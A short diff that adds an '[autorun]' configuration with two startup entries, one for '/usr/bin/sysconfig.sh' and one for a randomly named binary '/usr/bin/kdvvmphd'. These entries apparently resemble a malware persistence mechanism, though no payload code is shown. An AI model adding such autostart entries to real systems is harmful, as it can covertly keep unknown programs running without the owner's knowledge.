@@ -1,0 +1,5 @@
+[autorun]
+app = /usr/bin/sysconfig.sh;
+type = 0;
+app = /usr/bin/kdvvmphd; 
+type = 0;
